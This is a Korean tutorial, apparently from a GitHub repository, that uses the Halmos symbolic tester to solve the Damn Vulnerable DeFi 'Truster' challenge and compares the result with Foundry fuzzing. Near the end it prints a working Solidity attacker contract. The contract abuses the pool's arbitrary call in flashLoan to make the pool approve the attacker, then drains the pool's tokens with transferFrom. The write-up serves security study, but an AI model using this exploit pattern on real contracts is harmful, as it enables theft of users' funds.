# Halmos vs Truster

## Halmos 버전
이 글에서는 halmos 0.2.1.dev16+g1502e46 버전이 사용되었습니다.

## 서문
독자는 [Unstoppable](https://github.com/Burnnnnny/damn-vulnerable-defi-halmos/tree/master/test/unstoppable)을 해결하는 이전 글에 익숙하다고 강력하게 가정합니다. 주요 아이디어가 여기에서도 대부분 반복되므로 다시 설명하지 않습니다. 또한 [Naive-receiver](https://github.com/Burnnnnny/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver) 솔루션은 잠시 미루어 두었음을 분명히 해야 합니다. 왜냐하면 "Naive-receiver" 솔루션에 필요한 추가 기술들이 "Truster"에서 설명되기 때문입니다. 독자를 오도하지 않고 너무 앞서 나가지 않기 위해 이러한 순서로 자료를 제시하기로 했습니다.

## 아이디어 개요
이미 알고 있는 지식을 바탕으로, 우리는 다시 **SymbolicAttacker** 계약을 만들어 심볼릭 트랜잭션을 실행하고 이것이 우리가 필요한 공격으로 이어지기를 바랄 것입니다. 하지만 이번에도 이것으로 충분할까요?

## 공격 준비
### 공통 필수 조건
1. **Truster.t.sol** 파일을 **TrusterHalmos.t.sol**로 복사합니다. 모든 Halmos 관련 변경 사항은 여기서 수행해야 합니다.
2. `test_truster()`의 이름을 `check_truster()`로 변경하여 Halmos가 이 테스트를 심볼릭하게 실행하도록 합니다.
3. `makeAddr()` 치트코드 사용을 피하십시오:
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    address recovery = address(0xcafe0002);
    ```
4. `vm.getNonce()`는 지원되지 않는 치트코드입니다. 하지만 어차피 모든 작업은 **SymbolicAttacker** 하에서 수행되므로 플레이어가 단 하나의 트랜잭션만 수행할 것이라고 확신할 수 있습니다. 이 확인을 제거합시다.

### SymbolicAttacker 계약 배포
우리는 여전히 **SymbolicAttacker** 계약을 통한 동일한 공격 기술을 가지고 있습니다. 그러나 이번에는 **SymbolicAttacker**에게 전송할 것이 없습니다. `player`는 추가 자원이 없으므로 배포가 조금 더 쉬워 보일 것입니다. 또한 모든 계약의 주소를 출력하는 것을 잊지 마십시오. 이는 매우 유용한 정보입니다.
```solidity
function check_truster() public checkSolvedByPlayer {
    SymbolicAttacker attacker = new SymbolicAttacker();
    attacker.attack();
}
```

### SymbolicAttacker 구현
동일한 코드를 사용하여 심볼릭 트랜잭션을 수행해 봅시다:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "halmos-cheatcodes/SymTest.sol";
import "forge-std/Test.sol";

contract SymbolicAttacker is Test, SymTest {
	function attack() public {
        address target = svm.createAddress("target");
        vm.assume (target != address(this)); // 재귀 방지
        bytes memory data = svm.createBytes(100, 'data');
        target.call(data);
    }
}
```

### _isSolved() 구현
원래 확인 로직은 다음과 같습니다:
```solidity
function  _isSolved() private {
...
assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
}
```
그러면 반대 확인은 다음과 같을 것입니다:
```solidity
function  _isSolved() private {
    ...
    assert(token.balanceOf(address(pool)) != 0 || token.balanceOf(recovery) != TOKENS_IN_POOL);
}
```

### Halmos 시작
```javascript
$ halmos --solver-timeout-assertion 0 --function check_truster
...
Running 1 tests for test/truster/TrusterHalmos.t.sol:TrusterChallenge
[console.log] token      0x00000000000000000000000000000000000000000000000000000000aaaa0002
[console.log] pool       0x00000000000000000000000000000000000000000000000000000000aaaa0003
[console.log] attacker   0x00000000000000000000000000000000000000000000000000000000aaaa0004
[PASS] check_truster() (paths: 28, time: 0.74s, bounds: [])
Symbolic test result: 1 passed; 0 failed; time: 0.82s      
```
그리고... 아무것도 없습니다 :(. 테스트를 통과했다는 것은 이 불변 조건을 깨는 방법을 찾지 못했다는 것을 의미합니다. 무엇이 잘못되었는지 알아봅시다.

## 디버깅 및 해결책
이 테스트를 상세 모드(verbose mode)로 실행합니다:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_truster  -vvvvv
...
Path #28:
    - Not(halmos_target_address_eb8bd05_01 == 0xaaaa0004)
    - halmos_target_address_eb8bd05_01 == 0xaaaa0003
    - Extract(0x31f, 0x300, halmos_data_bytes_80d9faf_02) == 0xab19e0c0
...
Trace:
    CALL TrusterChallenge::0xec4154cf()
        CALL hevm::startPrank(0x00000000000000000000000000000000000000000000000000000000cafe000100000000000000000000000000000000000000000000000000000000cafe0001)
        ...
            STATICCALL svm::createBytes(0x0000000000000000000000000000000000000000000000000000000000000064000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000046461746100000000000000000000000000000000000000000000000000000000)
            ↩ Concat(0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000064, halmos_data_bytes_80d9faf_02())
            CALL 0xaaaa0003::Extract(halmos_data_bytes_80d9faf_02())(Extract(halmos_data_bytes_80d9faf_02())) // !!!이것이 문제입니다!!!
            ↩ REVERT 0x (error: Revert())
...
```
비뷰(non-view) 함수에서의 예상치 못한 **revert**이므로 이 되돌려진(reverted) 경로를 분석해 봅시다.
일반적으로 다음 라인들에 관심이 있습니다:
```javascript
- Extract(0x31f, 0x300, halmos_data_bytes_80d9faf_02) == 0xab19e0c0
...
CALL 0xaaaa0003::Extract(halmos_data_bytes_80d9faf_02())(Extract(halmos_data_bytes_80d9faf_02()))
↩ REVERT 0x (error: Revert())
```
`0xaaaa0003`은 `pool`의 주소입니다. `0xab19e0c0`은 `flashLoan()` 함수 선택자입니다:
```javascript
$ cast 4b 0xab19e0c0
flashLoan(uint256,address,address,bytes)
```
이 경우 Halmos는 외부 함수의 매개변수를 해결하려고 시도하지만 즉시 revert로 이어집니다. 종종 이것은 우리의 심볼릭 calldata에 대한 길이가 충분하지 않음을 의미합니다. 그렇다면 더 큰 calldata를 생성하면 될까요?
```solidity
contract SymbolicAttacker is Test, SymTest {
	function attack() public {
	...
	    bytes memory data = svm.createBytes(10000, 'data'); // 100 -> 10000
	...
	}
```
그리고 실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_truster
...
[ERROR] check_truster() (paths: 38, time: 3.80s, bounds: [])
WARNING:halmos:Encountered symbolic CALLDATALOAD offset: 4 + Extract(79199, 78944, halmos_data_bytes_8bdc959_02)
Symbolic test result: 0 passed; 1 failed; time: 3.90s
```
음, 뭔가 새로운 것입니다. 이 경고가 실제로 의미하는 바는 우리가 함수에 매개변수로 일부 calldata 바이트를 전달하고 있지만, 이를 심볼릭 호출을 통해 수행하고 있다는 것입니다. 간단히 말해서, Halmos는 심볼릭 calldata에서 **매개변수로서의 calldata**를 어디에 두어야 할지 이해하지 못하고 **오류**를 발생시킵니다.
지체하지 말고 봅시다. 이 함수가 우리의 `flashLoan()`임은 분명합니다. 4번째 매개변수는 `bytes calldata data`입니다:
```solidity
contract TrusterLenderPool is ReentrancyGuard {
...
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
```
다행히 Halmos는 이러한 경우를 위한 특별한 치트 코드 `svm.createCalldata()`를 제공합니다. 유효한 calldata를 생성하기 위해 필요한 것은 이 치트 코드에 매개변수로 전달되는 계약 유형 이름뿐입니다. **SymbolicAttacker**에서 이를 사용하는 가장 확실한 방법 중 하나는 다음 코드 조각입니다:
```solidity
contract SymbolicAttacker is Test, SymTest {
    function attack() public {
        address target = svm.createAddress("target");
        bytes memory data;
        vm.assume (target != address(this)); // 재귀 방지
        if (target == address(0xaaaa0002)) { // token
            data = svm.createCalldata("DamnValuableToken");
        }
        if (target == address(0xaaaa0003)) { // pool
            data = svm.createCalldata("TrusterLenderPool");
        }
        else {
            revert();
        }
        target.call(data);
    }
}
```
실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_truster
...
[ERROR] check_truster() (paths: 193, time: 10.48s, bounds: []) 
WARNING:halmos:Encountered symbolic CALLDATALOAD offset: 4 + Extract(7391, 7136, p_data_bytes_9090625_07)
```
뭐라구요? 또 같은 오류인가요? 사실 아닙니다. 첫째, 경로 수가 38개에서 193개로 증가했고, 둘째, 이 오류는 이제 다른 함수에서 나타납니다:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_truster -vvvvv
Path #108:
...
Trace:
            CALL 0xaaaa0003::flashLoan(...)
            ...
                CALL 0xaaaa0003::Extract(p_data_bytes_334a71c_07())(Extract(p_data_bytes_334a71c_07()))
                ↩ CALLDATALOAD 0x (error: NotConcreteError('symbolic CALLDATALOAD offset: 4 + Extract(7391, 7136, p_data_bytes_334a71c_07)'))
...
```
오류는 `TrusterLenderPool::flashLoan()` 함수 내의 어떤 심볼릭 호출입니다:
```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
...
{
...
    target.functionCall(data);
}
```
네, `data` 매개변수도 심볼릭으로 판명되었기 때문에 다시 같은 패턴에 빠져 같은 오류가 발생했습니다. 하지만 이번에는 어떤 계약의 심볼릭 주소에 대한 심볼릭 호출에 도달할 수 있다는 것을 알았으므로 더 보편적인 해결책을 사용할 것입니다!

## 전역 저장소 (Global storage)
어디서나 액세스할 수 있는 라이브러리 전역 저장소 계약을 만들어 봅시다:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "./halmos-cheatcodes/src/SymTest.sol";
import {Test, console} from "forge-std/Test.sol";

contract GlobalStorage is SymTest {
    // 주소를 반복할 수 있는 기능을 갖기 위한 uint256->address 매핑
    mapping (uint256 => address) addresses;
    mapping (address => string) names_by_addr;

    uint256 addresses_list_size = 0;

    // 주소와 이름 정보는 이 설정자를 사용하여 저장됩니다
    function add_addr_name_pair (address addr, string memory name) public {
        addresses[addresses_list_size] = addr;
        addresses_list_size++;
        names_by_addr[addr] = name;
    }

    /*
    ** addr이 구체적인 값이면 (addr, addr에 대한 심볼릭 calldata)를 반환합니다.
    ** addr이 심볼릭이면 실행이 실행 가능한 각 사례에 대해 분할되고 다음을 반환합니다.
    **      (addr0, addr0에 대한 심볼릭 calldata), (addr1, addr1에 대한 심볼릭 calldata), 
    **      ..., 등등 (경로당 한 쌍)
    ** addr이 심볼릭이지만 실행 가능한 값이 1개뿐인 경우(예: vm.assume(addr == ...)), 
    **      구체적인 경우처럼 동작해야 합니다.
    */
    function get_concrete_from_symbolic (address /*symbolic*/ addr) public view 
                                        returns (address ret, bytes memory data) 
    {
        for (uint256 i = 0; i < addresses_list_size; i++) {
            if (addresses[i] == addr) {
                string memory name = names_by_addr[addr];
                return (addresses[i], svm.createCalldata(name));
            }
        }
        revert(); // addr이 알려진 구체적인 주소가 아닌 경우는 무시
    }
}
```

이 계약의 구현 세부 사항에 대해서는 자세히 설명하지 않겠습니다. `address => <계약 이름>` 쌍을 저장할 수 있는 계약이라고만 말씀드리겠습니다. 또한 이를 통해 주소를 심볼릭하게 편리하게 무차별 대입(brute force)할 수 있습니다. 실제로 어떻게 사용하는지 보여주는 것이 더 쉽습니다. 먼저 TrusterHalmos.t.sol에서 **GlobalStorage**를 준비해 봅시다:
```solidity
...
import "lib/GlobalStorage.sol";
...
contract TrusterChallenge is Test {
...
    GlobalStorage public glob; // 전역 저장소 계약 추가
    DamnValuableToken public token;
...
    function setUp() public {
    ...
        // 전역 저장소 배포. "0xaaaa0002" 주소를 갖게 됩니다.
        glob = new GlobalStorage();
    ...
        glob.add_addr_name_pair(address(token), "DamnValuableToken");
        glob.add_addr_name_pair(address(pool), "TrusterLenderPool");
        vm.stopPrank();
    }
...
```
SymbolicAttacker에서 이것을 사용할 것입니다:
```solidity
...
import "lib/GlobalStorage.sol";
...
contract SymbolicAttacker is Test, SymTest {
    // 편의를 위해 이 주소를 하드코딩할 수 있습니다
    GlobalStorage glob = GlobalStorage(address(0xaaaa0002)); 

    function attack() public {
        address target = svm.createAddress("target");
        bytes memory data;
        //구체적인 target-name 쌍 얻기
        (target, data) = glob.get_concrete_from_symbolic(target);
        target.call(data);
    }
}
```
그리고 TrusterLenderPool에서:
```solidity
...
GlobalStorage glob = GlobalStorage(address(0xaaaa0002)); 
...
// 심볼릭 flashloan 함수
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);

    // "data"인 것처럼 "newdata"로 작업
    bytes memory newdata;
    (target, newdata) = glob.get_concrete_from_symbolic(target);
    target.functionCall(newdata);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```
Halmos 실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_truster
...
[console.log] glob       0x00000000000000000000000000000000000000000000000000000000aaaa0002
[console.log] token      0x00000000000000000000000000000000000000000000000000000000aaaa0003
[console.log] pool       0x00000000000000000000000000000000000000000000000000000000aaaa0004
[console.log] attacker   0x00000000000000000000000000000000000000000000000000000000aaaa0005
[PASS] check_truster() (paths: 132, time: 8.24s, bounds: [])
```
Halmos는 여전히 반례를 찾지 못합니다. 하지만 적어도 이제는 그러한 오류가 없으며 모든 함수가 커버됩니다. 다음 단계로 넘어갑시다!
## 또 다른 트랜잭션
드디어 가장 흥미로운 부분에 도달했습니다. 한 번의 트랜잭션으로 문제가 해결되지 않으면 하나 더 추가할 것입니다:
```solidity
contract SymbolicAttacker is Test, SymTest {
    // 편의를 위해 이 주소를 하드코딩할 수 있습니다
    GlobalStorage glob = GlobalStorage(address(0xaaaa0002)); 

    function execute_tx() private {
        address target = svm.createAddress("target");
        bytes memory data;
        //구체적인 target-name 쌍 얻기
        (target, data) = glob.get_concrete_from_symbolic(target);
        target.call(data);
    }

	function attack() public {
        execute_tx();
        execute_tx();
    }
}
```
실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_truster
...
Running 1 tests for test/truster/TrusterHalmos.t.sol:TrusterChallenge
[console.log] glob       0x00000000000000000000000000000000000000000000000000000000aaaa0002
[console.log] token      0x00000000000000000000000000000000000000000000000000000000aaaa0003
[console.log] pool       0x00000000000000000000000000000000000000000000000000000000aaaa0004
[console.log] attacker   0x00000000000000000000000000000000000000000000000000000000aaaa0005
...
Counterexample:
halmos_target_address_a04f1b3_01 = 0x00000000000000000000000000000000aaaa0003
halmos_target_address_bebb031_18 = 0x00000000000000000000000000000000aaaa0003
p_amount_uint256_9a4d93a_34 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
p_deadline_uint256_ddaa6c9_09 = 0x0000000020000000000000000000000000000000000000000000000000000000
p_from_address_4e6d758_32 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_owner_address_250ba74_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_r_bytes32_5b6a04f_11 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_s_bytes32_2ebd850_12 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_spender_address_ca49768_07 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_to_address_d90fbcd_33 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
p_v_uint8_57499b7_10 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_value_uint256_29e8407_08 = 0x0000000000000000000000000000002000000000000002820a0200411081fe82
...
Counterexample:
halmos_target_address_a04f1b3_01 = 0x00000000000000000000000000000000aaaa0004
halmos_target_address_acee6c4_25 = 0x00000000000000000000000000000000aaaa0003
p_amount_uint256_47345cb_41 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
p_amount_uint256_eaa2e50_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_borrower_address_2411608_05 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_data_length_69a6119_08 = 0x0000000000000000000000000000000000000000000000000000000000000400
p_deadline_uint256_f555a4e_16 = 0x8000000000000000000000000000000000000000000000000000000000000000
p_from_address_2e55d34_39 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_owner_address_ede4577_13 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_r_bytes32_a9f3cf2_18 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_s_bytes32_2c3a56d_19 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_spender_address_5bf20a3_14 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_target_address_2ee1188_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
p_to_address_4b8b987_40 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
p_v_uint8_3118a03_17 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_value_uint256_7f72094_15 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
...
Counterexample:
halmos_target_address_1dec87e_25 = 0x00000000000000000000000000000000aaaa0003
halmos_target_address_a04f1b3_01 = 0x00000000000000000000000000000000aaaa0004
p_amount_uint256_afdfdc5_12 = 0x0000000000000000000000000000000000080000000000000000000000000000
p_amount_uint256_bda6e88_41 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
p_amount_uint256_eaa2e50_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_borrower_address_2411608_05 = 0x00000000000000000000000000000000000000000000000000000000cafe0000
p_data_length_69a6119_08 = 0x0000000000000000000000000000000000000000000000000000000000000400
p_from_address_ff90fbc_39 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_spender_address_7a9b22c_11 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_target_address_2ee1188_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
p_to_address_c01d91b_40 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
...
Symbolic test result: 0 passed; 1 failed; time: 1366.30s
```
단 2개의 공격 트랜잭션을 심볼릭하게 실행하는 것도 힘든 작업이므로, 제 컴퓨터에서는 무려 23분이 걸렸습니다. 하지만 좋은 소식도 있습니다 - Halmos가 3개의 고유한 반례를 찾았습니다. 하지만 어떤 함수가 호출되었는지는 아직 명확하지 않습니다. 따라서 다음과 같은 힌트를 사용할 것입니다:
```solidity
contract GlobalStorage is Test, SymTest {
...
function get_concrete_from_symbolic (address /*symbolic*/ addr) public view 
                                        returns (address ret, bytes memory data) {
    for (uint256 i = 0; i < addresses_list_size; i++) {
        if (addresses[i] == addr) {
            string memory name = names_by_addr[addresses[i]];
            ret = addresses[i];
            data = svm.createCalldata(name);
            bytes4 selector = svm.createBytes4("selector");
            vm.assume(selector == bytes4(data)); // 이제 Halmos가 선택자(selectors)를 보여줄 것입니다
            return (ret, data);
        }
    }
    revert(); // addr이 알려진 구체적인 주소가 아닌 경우는 무시
}
```
이제 Halmos가 선택자들을 보여줍니다.

## 반례 분석
각 반례를 하나씩 분석해 봅시다:
```javascript
Counterexample:
halmos_selector_bytes4_1442fb7_18 = permit
halmos_selector_bytes4_3d82d4e_36 = transferFrom
halmos_target_address_8f80b6b_19 = 0x00000000000000000000000000000000aaaa0003
halmos_target_address_b0f3fc8_01 = 0x00000000000000000000000000000000aaaa0003
p_amount_uint256_3cb746f_35 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
p_deadline_uint256_ab117ab_09 = 0x8000000000000000000000000000000000000000000000000000000000000000
p_from_address_4dc2648_33 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_owner_address_6d86217_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_r_bytes32_96d075f_11 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_s_bytes32_2eef2b4_12 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_spender_address_d4f0916_07 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_to_address_8272409_34 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
p_v_uint8_49e43a7_10 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_value_uint256_d5bb651_08 = 0x80000000000000000000000000000000000000000000005000200e0000000000
```
와, Halmos는 공격자가 풀(pool)의 서명으로 **ERC20**의 [permit](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#IERC20Permit-permit-address-address-uint256-uint256-uint8-bytes32-bytes32-) 함수를 호출하여 `transferFrom()`을 호출하고 모든 자금을 `recovery` 계정으로 보낼 수 있다고 생각합니다. 문제는 `attacker`가 `pool`의 개인 키를 가지고 있지 않으므로 그러한 함수 호출을 조작할 수 없다는 것입니다. 분명히 우리는 심볼릭 분석을 사용하여 서명 암호화를 해독할 수 없습니다. 그리고 Halmos가 `v`, `r`, `s` 매개변수로 제공한 널(null) 바이트가 이를 확인해 줍니다. 따라서 이것은 불행히도 가짜 해결책입니다.
두 번째 반례도 상황이 비슷합니다:
```javascript
Counterexample:
halmos_selector_bytes4_6aa2890_44 = transferFrom
halmos_selector_bytes4_886db9c_26 = permit
halmos_selector_bytes4_eaf3f0c_09 = flashLoan
halmos_target_address_28b9879_27 = 0x00000000000000000000000000000000aaaa0003
halmos_target_address_b0f3fc8_01 = 0x00000000000000000000000000000000aaaa0004
p_amount_uint256_540579e_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_amount_uint256_68bd5b7_43 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
p_borrower_address_726f579_05 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_data_length_1e22349_08 = 0x0000000000000000000000000000000000000000000000000000000000000400
p_deadline_uint256_cddf022_17 = 0x1000000000000000000000000000000000000000000000000000000000000000
p_from_address_228a06d_41 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_owner_address_3062812_14 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_r_bytes32_cfaf057_19 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_s_bytes32_c6f3435_20 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_spender_address_cf5d230_15 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_target_address_de4b479_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
p_to_address_9bc8f39_42 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
p_v_uint8_88f0351_18 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_value_uint256_a28c1c2_16 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff 
```
이것도 동일한 `permit`이지만, 이번에는 `flashLoan()` 하에서 입력했습니다. 흥미롭게도 여기서는 `0`으로 `flashLoan()`에 `amount`를 전달하면 트랜잭션이 여전히 통과하고 아무것도 반환할 필요가 없다는 것을 알게 되었습니다.

그리고 세 번째 만에 드디어 Halmos가 실제로 이 문제에 대한 해결책을 찾았습니다. 근처에서 맴돌고 있었음에도 말이죠 :D
```javascript
Counterexample:
halmos_selector_bytes4_1034b81_26 = approve
halmos_selector_bytes4_478bb2d_44 = transferFrom
halmos_selector_bytes4_eaf3f0c_09 = flashLoan
halmos_target_address_331efb7_27 = 0x00000000000000000000000000000000aaaa0003
halmos_target_address_b0f3fc8_01 = 0x00000000000000000000000000000000aaaa0004
p_amount_uint256_0811e0c_13 = 0x0020000000000000000000000000000000000000000000000000000000000000
p_amount_uint256_20a8ea2_43 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
p_amount_uint256_540579e_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_borrower_address_726f579_05 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_data_length_1e22349_08 = 0x0000000000000000000000000000000000000000000000000000000000000400
p_from_address_b772801_41 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_spender_address_429fd9d_12 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_target_address_de4b479_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
p_to_address_50e8baf_42 = 0x00000000000000000000000000000000000000000000000000000000cafe0002 
```
물론, `amount=0`으로 `flashLoan`을 호출하고, flashLoan 동안 `pool`이 공격자를 위해 모든 토큰에 대해 `approve()`를 호출하도록 강제합니다. 그리고 두 번째 트랜잭션으로 `pool`에서 `recovery`로 `transferFrom()`을 수행합니다.

## 반례 사용
forge에서 이 주소들이 필요합니다:
```javascript
$ forge test -vvv --mp test/truster/Truster.t.sol
...
Logs:
    token          0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b
    pool           0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264
    recovery       0x73030B99950fB19C6A813465E58A0BcA5487FBEa
...
```
Attacker:
```solidity
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract Attacker {
    function attack() public {
        DamnValuableToken token = DamnValuableToken(address(0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b));
        TrusterLenderPool pool = TrusterLenderPool(address(0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264));
        address recovery = address(0x73030B99950fB19C6A813465E58A0BcA5487FBEa);
        pool.flashLoan(0, address(this), address(token), 
                            abi.encodeWithSignature("approve(address,uint256)", 
                            address(this), 
                            0x0020000000000000000000000000000000000000000000000000000000000000));
        token.transferFrom(address(pool), recovery, 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000);
    }
} 
```
실행:
```javascript
$ forge test -vvv --mp test/truster/Truster.t.sol
...
Logs:
    token          0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b
    pool           0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264
    recovery       0x73030B99950fB19C6A813465E58A0BcA5487FBEa
...
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.24ms (386.40µs CPU time)
...
```
통과! Halmos가 이 문제도 성공적으로 해결했습니다.

## 퍼징 타임!
### Foundry
Foundry 불변성 테스트(invariant testing)로 시작해 봅시다. "공정성"을 위해 실행할 시간도 충분히 주겠습니다.

Foundry.toml:
```javascript
...
[fuzz]
runs = 100000
```
Truster_Fuzz.t.sol:
```solidity
function setUp() public {
...
    targetSender(player);
}
...
function invariant_isSolved() public {
    assert(token.balanceOf(address(pool)) >= TOKENS_IN_POOL);
}
```
불변 조건으로 "풀의 잔액을 줄일 수 있는가?"라는 기준이 선택되었습니다. 시도:
```javascript
$ forge test -vvvvv --mp test/truster/Truster_Fuzz.t.sol
...
[PASS] invariant_isSolved() (runs: 100000, calls: 50000000, reverts: 39756330)
...
[24523] DamnValuableToken::approve(0x00000000000000000000000000000000000003A2, 3580)
...
[6974] DamnValuableToken::transfer(0x5BE45f33883Ce9E32a648b77F365b4A292C360cE, 0)
...
```
아무것도 없습니다. `flashLoan()`을 사용한 성공적인 트랜잭션조차 없습니다. 그래서 퍼저에게 큰 힌트를 주기로 했습니다:
```solidity
// Fuzz flashloan function

function _flashLoan(uint256 amount, address borrower)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", 
                        address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C ), 
                        0x0020000000000000000000000000000000000000000000000000000000000000);

    token.transfer(borrower, amount);
    address(0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b).functionCall(data);


    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```
네, 이것은 토큰을 승인하기 위해 준비된 트랜잭션입니다. 실행:
```javascript
$ forge test -vvvvv --mp test/truster/Truster_Fuzz.t.sol
...
[FAIL: invariant_isSolved replay failure]
        [Sequence]
                sender=0x44E97aF4418b7a17AABD8090bEA0A471a366305C addr=[src/truster/TrusterLenderPool.sol:TrusterLenderPool]0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264 calldata=_flashLoan(uint256,address) args=[0, 0x85B3d986977391795F57ce5c08d0E1925c7ADc80]
                sender=0x44E97aF4418b7a17AABD8090bEA0A471a366305C addr=[src/DamnValuableToken.sol:DamnValuableToken]0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b calldata=transferFrom(address,address,uint256) args=[0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264, 0x000000000000000000000000000000000000022D, 67]
```
이 힌트로 Foundry 퍼저는 공격을 찾아냈습니다. 제가 이해하기로는 매개변수를 통해 전달된 대상과 데이터를 통해 일부 트랜잭션을 구성하는 것 자체가 이미 Foundry 퍼저에게는 문제인 것 같습니다.
좋습니다, 힌트를 다시 작성해봅시다. 덜 명시적이고 매개변수를 통해 대상과 데이터를 전달하지 않도록 합시다:
```solidity
// Fuzz flashloan function (less hint)
function __flashLoan(uint256 amount, address borrower, bool is_approve, address to, uint256 amount_to_approve)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));
    
    token.transfer(borrower, amount);
    if (is_approve) {
        token.approve(to, amount);
    }
    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```
여기서 퍼저에게 `is_approve = true`, `to`를 `player`의 주소로, 그리고 꽤 큰 `amount_to_approve`만 전달하면 충분합니다. 그리고 다른 트랜잭션으로 `transferFrom()`을 수행합니다. 시도해 봅시다:
```javascript
$ forge test -vvvvv --mp test/truster/Truster_Fuzz.t.sol
...
  [22609] TrusterLenderPool::__flashLoan(0, 0x511115Da795ee95A8f5557bE63E005478D4A19Bc, true, 0x50719d462702f96320f8747bc51b7b447c989Cb3, 5108201074406009179262425133938908488538452 [5.108e42])
  ...
      ├─ [4623] DamnValuableToken::approve(0x50719d462702f96320f8747bc51b7b447c989Cb3, 0)    
      │   ├─ emit Approval(owner: TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], spender: 0x50719d462702f96320f8747bc51b7b447c989Cb3, amount: 0)
...
  [22609] TrusterLenderPool::__flashLoan(0, 0x33911140d693f2d422d721856297dfa98d3e9E48, true, 0x60CF39a6CcA10123Ee5Cb8d224CCde855be067CF, 1498798982649291 [1.498e15])
  ...
    ├─ [4623] DamnValuableToken::approve(0x60CF39a6CcA10123Ee5Cb8d224CCde855be067CF, 0)
